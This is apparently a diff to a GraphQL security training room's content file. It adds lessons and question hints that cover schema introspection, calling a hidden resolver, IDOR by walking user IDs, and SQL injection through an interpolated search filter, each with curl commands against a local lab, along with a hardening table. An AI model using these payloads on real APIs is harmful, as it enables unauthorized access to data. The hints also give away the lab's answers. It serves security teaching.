@@ -4,17 +4,34 @@
   "tasks": {
     "1": {
       "title": "Introspection: the attacker's map",
+      "body": "## An endpoint that explains itself\n\nGraphQL exposes `__schema`: any client can request the full map\nof types, fields and arguments. It is a development feature that, in\nproduction, is a gift: the attacker doesn't guess endpoints — they are handed over.\n\n```bash\ncurl -s http://127.0.0.1:18109/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\": \"{ __schema { types { name fields hint } } }\"}' | jq .\n```\n\nIn the lab you will see a type marked `hidden: true`. In a real GraphQL API the\n\"internal\" types (debug, admin, deprecated) live in the schema just the same:\nintrospection can't tell what the team forgot to remove.\n\n**The right stance**: introspection OFF in production (Apollo:\n`validationRules: [NoSchemaIntrospectionCustomRule]`), or behind admin\nauth. \"Hiding\" the schema without disabling resolution protects nothing —\nas you are about to see.\n\n## The hidden type that wasn't hidden\n\nRequest the field the hint handed you:\n\n```bash\ncurl -s http://127.0.0.1:18109/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\": \"{ secretFlag { value } }\"}'\n```\n\nThe resolver exists and responds. A field nobody was supposed to know about is still\na field anyone can call: security through obscurity\nin GraphQL dies the day someone runs introspection.\n\n## IDOR with nice typing\n\n```bash\ncurl -s http://127.0.0.1:18109/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\": \"{ user(id:1) { email note } }\"}'\n```\n\n`user(id: N)` looks up by ID without comparing against the session — classic BOLA.\nWalk the IDs (1, 2, 3...) and every other user's record falls. In GraphQL this bug is\nmore frequent than in REST because each resolver is written separately and\nwhoever doesn't validate the argument \"forgets\" the authorization.",
       "questions": {
-        "graphql-security-t01-q01": { "prompt": "Query the __schema and find the type marked hidden. What does its hint field give you to reach the flag? (submit the type name)" },
-        "graphql-security-t01-q02": { "prompt": "You are alice (id=2). Retrieve user id=1's (admin) note via the user query. Submit the flag." },
-        "graphql-security-t01-q03": { "prompt": "Use the hidden type the introspection revealed to get the final flag." }
+        "graphql-security-t01-q01": {
+          "prompt": "Query the __schema and find the type marked as hidden (its hint field tells you how to reach the flag). What is that type called?",
+          "hint": "curl -s http://127.0.0.1:18109/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name hint } } }\"}'"
+        },
+        "graphql-security-t01-q02": {
+          "prompt": "You are alice (id=2). Retrieve user id=1's (admin) note via the user query. Submit the flag.",
+          "hint": "{\"query\":\"{ user(id:1) { email note } }\"} — the resolver checks neither owner nor role"
+        },
+        "graphql-security-t01-q03": {
+          "prompt": "Use the hidden type the introspection revealed to get the final flag.",
+          "hint": "query { secretFlag { value } } — resolvers exist for EVERY type in the schema"
+        }
       }
     },
     "2": {
       "title": "Filter injection: the resolver that interpolates",
+      "body": "## The same old SQLi, with modern syntax\n\nThe lab's resolver does something like:\n\n```python\nsql = f\"SELECT * FROM documents WHERE title LIKE '%{q}%' AND class != 'restricted'\"\n```\n\nThe GraphQL syntax is new; the vulnerability is straight out of the 90s. With the\ninjection, the `AND class != 'restricted'` no longer has any effect:\n\n```bash\ncurl -s http://127.0.0.1:18109/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\": \"{ search(q: \\\"'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1\\\") { title class } }\"}'\n```\n\n(with websocat-like quoting this gets messy: the lab panel has the\nexact command ready to copy). The result: all three documents, including the\nrestricted postmortem with the flag.\n\n## How a real GraphQL API is hardened\n\n| Layer | Measure |\n|---|---|\n| Schema | Introspection off, depth/complexity limits (anti-query-bomb) |\n| Queries | **Persisted queries**: only operations pre-registered by the frontend are executed |\n| Resolvers | Authorization PER OBJECT in every resolver (never \"the endpoint already validated it\") |\n| Inputs | Typed parameters + escaping/ORM, just like classic SQL |\n| Rate limit | Query cost per user (a single nested query can cost as much as 1000 requests) |\n\nThe cross-cutting lesson of this room: GraphQL changes the TRANSPORT of\nqueries, not the rules of the game. Everything you learned about IDOR, injection\nand authorization applies just the same — except that now the attacker picks the exact\nshape of the query, and you have to validate it on the server.",
       "questions": {
-        "graphql-security-t02-q01": { "prompt": "The search(q:) field interpolates the filter. Collapse the WHERE with a classic OR and submit the restricted document's flag." },
-        "graphql-security-t02-q02": { "prompt": "Which hardened-GraphQL defense layer validates the query against an operation allowlist before executing (production)?" }
+        "graphql-security-t02-q01": {
+          "prompt": "The search(q:) field interpolates the filter. Collapse the WHERE with a classic OR and submit the restricted document's flag.",
+          "hint": "{\"query\":\"{ search(q:\\\"' OR '1'='1\\\") { title class } }\"} — returns ALL documents, including the restricted one"
+        },
+        "graphql-security-t02-q02": {
+          "prompt": "Which hardened-GraphQL defense layer validates the query against an operation allowlist before executing (production)?",
+          "hint": "Persisted queries / operation allowlisting: the server only executes pre-registered queries"
+        }
       }
     }
   }
